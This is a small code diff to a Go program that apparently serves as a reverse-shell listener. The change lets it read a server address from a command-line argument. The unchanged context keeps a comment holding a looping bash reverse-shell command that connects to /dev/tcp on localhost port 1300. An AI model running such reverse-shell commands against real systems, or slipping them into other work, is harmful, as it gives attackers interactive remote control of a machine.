@@ -7,6 +7,10 @@ import (
 
 // while true; do bash -c 'bash -i >& /dev/tcp/127.0.0.1/1300 0>&1'; sleep 10; done
 func main() {
+	if len(os.Args) > 1 {
+                _server = os.Args[1]
+        }
+
 	go listenf()
 
 	fmt.Printf(logo)
